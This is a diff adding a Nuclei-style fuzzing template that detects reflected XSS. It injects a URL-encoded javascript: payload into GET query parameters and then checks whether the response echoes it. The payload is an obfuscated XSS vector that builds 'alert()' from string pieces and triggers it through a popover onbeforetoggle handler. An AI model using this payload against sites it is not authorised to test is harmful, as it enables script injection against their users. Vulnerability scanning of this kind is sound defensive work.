@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-js
+
+info:
+  name: Custom Reflection XSS Detection with JavaScript
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a JavaScript payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xssPayload:
+        - "javascript%3Avar%20a%3D%22ale%22%3Bvar%20b%3D%22rt%22%3Bvar%20c%3D%22%28%29%22%3BdecodeURI%28%22%26lt%3Bbutton%20popovertarget%3Dx%26gt%3BClick%20me%26lt%3B%2Fbutton%26gt%3B%26lt%3Bhvita%20onbeforetoggle%3D%22%2Ba%2Bb%2Bc%2B%22%20popover%20id%3Dx%26gt%3BHvita%26lt%3B%2Fhvita%26gt%3B%22%29"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xssPayload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xssPayload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
